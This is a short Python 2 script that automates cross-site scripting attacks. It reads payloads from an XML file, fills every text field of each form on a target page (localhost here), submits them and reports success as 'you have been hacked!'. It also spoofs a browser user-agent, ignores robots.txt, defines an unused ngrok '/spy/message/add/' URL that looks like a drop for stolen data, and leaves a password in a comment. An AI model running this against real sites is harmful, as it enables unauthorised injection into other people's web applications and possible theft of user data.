import mechanize
import cookielib
from BeautifulSoup import BeautifulSoup
import html2text
import requests
import xml.etree.ElementTree as ET

# Browser
br = mechanize.Browser()

# Cookie Jar
cj = cookielib.LWPCookieJar()
br.set_cookiejar(cj)

# Browser options
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)


# Follows refresh 0 but not hangs on refresh > 0
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

# User-Agent (this is cheating, ok?)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

# The site we will navigate into, handling it's session
url="http://www.google.com"
url1="http://localhost/ui"
url2="http://46134195.ngrok.com/spy/message/add/"


source_code = requests.get(url1)
plain_text = source_code.text
soup = BeautifulSoup(plain_text)
forms_page=soup.findAll('form')
forms_number= len(forms_page)
tree = ET.parse('xssAttacks.xml')
root=tree.getroot()
#root = ET.fromstring(xss_data_as_string)
    
if forms_number>0:
    for i in range(0,forms_number):
        

        for attack in root.findall('attack'):
            code = attack.find('code').text       
            code=str(code)
            #code='<script id=injected>alert("xss")</script>'
            print "------------------------------------------"
            print "Injected code: "+code
            input=forms_page[i].findAll('input')
            br.open(url1)
            br.select_form(nr=i)
            for inp in input:
                if inp['type']=='text':
                    if inp['name']=='email' or inp['name']=="Email":
                        br.form[inp['name']]='test@test.com'
                    #print "Name: "+inp['name']
                    br.form[inp['name']]=code
                                        
            br.submit()
            #print br.response().read()
            soup_response = BeautifulSoup(br.response().read())
            match=soup_response.body.findAll('script',{"id" : "injected"})
            text_match=soup_response.body.findAll(text='XSS')
            #print text_match
            if len(match)>0 or len(text_match)>0:
                print"Response: Yo!, you have been hacked!"
            else:
                print "Response: Injection failed, injecting another one!"   
            br.back()


else:
    print "Checking input fields now..."

     

# Select the first (index zero) form

# User credentials
#br.form['group_id'] = '2'
#br.form['password'] = 'YhzrwqNEOA'

# Login
#br.submit()
#print br.response().read()

